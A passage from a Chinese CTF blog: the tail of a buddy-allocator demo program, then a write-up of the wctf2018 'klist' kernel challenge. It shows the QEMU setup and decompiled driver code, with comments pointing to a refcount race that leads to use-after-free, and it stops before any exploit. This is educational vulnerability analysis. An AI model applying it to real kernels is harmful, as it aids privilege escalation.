class="built_in">printf</span>(<span class="string">&quot;|5. exit       |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, choice);</span><br><span class="line">    choice[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> choice[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    buddy* bd = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        choice = Choose();</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x31</span>: </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input size:\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">            bd = buddy_new(size);</span><br><span class="line">            buddy_print(bd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x32</span>:</span><br><span class="line">            <span class="keyword">if</span> (bd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nplease create a Buddy System first\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input size\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">            buddy_alloc(bd, size);</span><br><span class="line">            buddy_print(bd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x33</span>:</span><br><span class="line">            <span class="keyword">if</span> (bd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nplease create a Buddy System first\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input offset\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">            buddy_free(bd, size);</span><br><span class="line">            buddy_print(bd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x34</span>:</span><br><span class="line">            <span class="keyword">if</span> (bd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nplease create a Buddy System first\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            buddy_print(bd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x35</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nending\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Choice wrong\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/UAF+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/27/UAF+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="post-title-link" itemprop="url">UAF+条件竞争</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-27 15:11:26" itemprop="dateCreated datePublished" datetime="2022-05-27T15:11:26+08:00">2022-05-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-22 13:25:29" itemprop="dateModified" datetime="2022-06-22T13:25:29+08:00">2022-06-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>wctf2018-klist 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 </span><br><span class="line">-enable-kvm </span><br><span class="line">-cpu kvm64,+smep # 开了smep</span><br><span class="line">-kernel ./bzImage </span><br><span class="line">-append &quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot; # 开了kaslr </span><br><span class="line">-initrd ./rootfs.cpio</span><br><span class="line">-nographic -m 2G # 我去,直接给2G</span><br><span class="line">-smp cores=2,threads=2,sockets=1 -monitor /dev/null </span><br><span class="line">-nographic</span><br><span class="line">~  </span><br></pre></td></tr></table></figure>
<p>PS：我们加上 “-s” 方便调试</p>
<p>然后做好基础工作：解压 rootfs.cpio，提取 vmlinux，提取 gadget</p>
<p>一般的 kernel pwn 都喜欢在驱动文件那里设置漏洞，用 IDA 进行分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>list_ioctl：设置了“add_item”，“remove_item”，“select_item”函数，“list_head”函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">list_ioctl</span><span class="params">(__int64 fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> request, <span class="keyword">void</span> *user_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( request == <span class="number">0x1338</span> )</span><br><span class="line">    <span class="keyword">return</span> select_item((fd *)fd, (__int64)user_ptr);</span><br><span class="line">  <span class="keyword">if</span> ( request &lt;= <span class="number">0x1338</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( request == <span class="number">0x1337</span> )</span><br><span class="line">      <span class="keyword">return</span> add_item((input *)user_ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( request == <span class="number">0x1339</span> )</span><br><span class="line">      <span class="keyword">return</span> remove_item((__int64)user_ptr);</span><br><span class="line">    <span class="keyword">if</span> ( request == <span class="number">0x133A</span> )</span><br><span class="line">      <span class="keyword">return</span> list_head(user_ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>add_item：创建节点，插入链表头部</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">add_item</span><span class="params">(input *user_input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  item *list_ptr; <span class="comment">// rax MAPDST</span></span><br><span class="line">  __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  __int64 item_ptr; <span class="comment">// rsi</span></span><br><span class="line">  item *prev; <span class="comment">// rax</span></span><br><span class="line">  input user_data; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;user_data, user_input, <span class="number">16LL</span>) || user_data.size &gt; <span class="number">0x400</span>uLL )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  list_ptr = (item *)_kmalloc(user_data.size + <span class="number">24</span>, <span class="number">0x14202C0</span>LL);</span><br><span class="line">  size = user_data.size;</span><br><span class="line">  item_ptr = user_data.ptr;</span><br><span class="line">  list_ptr-&gt;refcount = <span class="number">1</span>; <span class="comment">/* 设置引用计数refcount为&#x27;1&#x27;(关键) */</span></span><br><span class="line">  list_ptr-&gt;size = size;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;list_ptr-&gt;data, item_ptr, size) )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(list_ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_lock(&amp;list_lock); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">    prev = g_list;</span><br><span class="line">    g_list = list_ptr; <span class="comment">/* 直接插头 */</span></span><br><span class="line">    list_ptr-&gt;next = prev;</span><br><span class="line">    mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>remove_item：释放结点，并且脱链</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">remove_item</span><span class="params">(__int64 idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  item *list_unit; <span class="comment">// rax MAPDST</span></span><br><span class="line">  __int64 i; <span class="comment">// rdx</span></span><br><span class="line">  item *delete_list_unit; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    mutex_lock(&amp;list_lock); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">    <span class="keyword">if</span> ( !idx )</span><br><span class="line">    &#123;</span><br><span class="line">      list_unit = g_list;</span><br><span class="line">      <span class="keyword">if</span> ( g_list )</span><br><span class="line">      &#123;</span><br><span class="line">        g_list = g_list-&gt;next;</span><br><span class="line">        put(list_unit);</span><br><span class="line">        mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    list_unit = g_list;</span><br><span class="line">    <span class="keyword">if</span> ( idx != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !g_list )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      i = <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++i;</span><br><span class="line">        list_unit = list_unit-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> ( idx == i )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !list_unit )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    delete_list_unit = list_unit-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> ( delete_list_unit )</span><br><span class="line">    &#123;</span><br><span class="line">      list_unit-&gt;next = delete_list_unit-&gt;next;</span><br><span class="line">      put(delete_list_unit);</span><br><span class="line">      mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>select_item：选择指定位置的节点记录到缓冲区里（这样才能对其进行 read/write 操作）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">select_item</span><span class="params">(fd *fd, __int64 idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  item *list_unit; <span class="comment">// rbx</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="built_in">list</span> *using_list; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;list_lock); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  list_unit = g_list; <span class="comment">/* g_list为list_unit链表头 */</span></span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !g_list ) <span class="comment">/* 头结点不存在,返回错误代码 */</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">      mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> ) <span class="comment">/* 遍历整个list_unit链表,获取对应index的item结点 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++i;</span><br><span class="line">      list_unit = list_unit-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> ( idx == i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !list_unit )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !list_unit ) <span class="comment">/* 输入的index没有对应的结点,返回错误代码 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  get(list_unit); </span><br><span class="line">  mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">  using_list = fd-&gt;using_list; <span class="comment">/* 从结构体fd中获取内核缓冲区(从kmem_cache分配) */</span></span><br><span class="line">  mutex_lock(&amp;using_list-&gt;mutex); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  put(using_list-&gt;item); </span><br><span class="line">  using_list-&gt;item = list_unit; <span class="comment">/* 注意:如果item在put中被释放,后面的解锁就会报错 */</span></span><br><span class="line">  mutex_unlock(using_list-&gt;mutex); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">get</span><span class="params">(item *item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _InterlockedIncrement(&amp;item-&gt;refcount); <span class="comment">/* 实现数的原子加 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">put</span><span class="params">(item *item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( item )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedDecrement(&amp;item-&gt;refcount) ) <span class="comment">/* 实现数的原子减 */</span></span><br><span class="line">      <span class="keyword">return</span> kfree(item); <span class="comment">/* item-&gt;refcount减到&#x27;0&#x27;后释放item */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>list_open：打开一个文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_open</span><span class="params">(__int64 a1, fd *fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">list</span> *using_list; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  using_list = (<span class="built_in">list</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x14282C0</span>LL, <span class="number">0x28</span>LL); <span class="comment">/* 从kmem_cache中分配一个object,作为缓冲区 */</span></span><br><span class="line">  _mutex_init(&amp;using_list-&gt;mutex, <span class="string">&quot;&amp;data-&gt;lock&quot;</span>, &amp;copy_from_user); <span class="comment">/* 初始化互斥锁 */</span></span><br><span class="line">  fd-&gt;using_list = using_list; <span class="comment">/* 把缓冲区using_list存储在fd结构体中 */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>list_read：读操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_read</span><span class="params">(fd *fd, __int64 addr, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">list</span> *using_list; <span class="comment">// r13</span></span><br><span class="line">  item *item; <span class="comment">// rsi</span></span><br><span class="line">  __int64 *mutex_var; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  using_list = fd-&gt;using_list; <span class="comment">/* 从结构体fd中获取内核缓冲区(从kmem_cache分配) */</span></span><br><span class="line">  mutex_lock(&amp;using_list-&gt;mutex); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  item = using_list-&gt;item; <span class="comment">/* item:指向缓冲区的指针 */</span></span><br><span class="line">  <span class="keyword">if</span> ( using_list-&gt;item )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( item-&gt;size &lt;= size )</span><br><span class="line">      size = item-&gt;size; <span class="comment">/* 限制点:杜绝了缓冲区溢出的发生 */</span></span><br><span class="line">    mutex_var = using_list-&gt;mutex;</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(addr, &amp;item-&gt;data, size) ) <span class="comment">/* 把内核数据拷贝到用户缓冲区 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(mutex_var); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(mutex_var); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_unlockusing_list-&gt;mutex); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>list_write：写操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_write</span><span class="params">(fd *fd, __int64 addr, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">list</span> *using_list; <span class="comment">// rbp</span></span><br><span class="line">  item *item; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 *mutex_var; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  using_list = fd-&gt;using_list; <span class="comment">/* 从结构体fd中获取内核缓冲区(从kmem_cache分配) */</span></span><br><span class="line">  mutex_lock(&amp;using_list-&gt;mutex); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  item = using_list-&gt;item; <span class="comment">/* item:指向缓冲区的指针 */</span></span><br><span class="line">  <span class="keyword">if</span> ( using_list-&gt;item )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( item-&gt;size &lt;= size )</span><br><span class="line">      size = item-&gt;size; <span class="comment">/* 限制点:杜绝了缓冲区溢出的发生 */</span></span><br><span class="line">    v6 = copy_from_user(&amp;item-&gt;data, addr, size); <span class="comment">/* 从用户缓冲区拷贝数据到内核 */</span></span><br><span class="line">    mutex_var = using_list-&gt;mutex;</span><br><span class="line">    <span class="keyword">if</span> ( v6 ) <span class="comment">/* copy_from_user失败返回没有被拷贝的字节数,成功返回&#x27;0&#x27; */</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(mutex_var); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(mutex_var); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_unlockusing_list-&gt;mutex); <span class="comment">/* 解除互斥锁 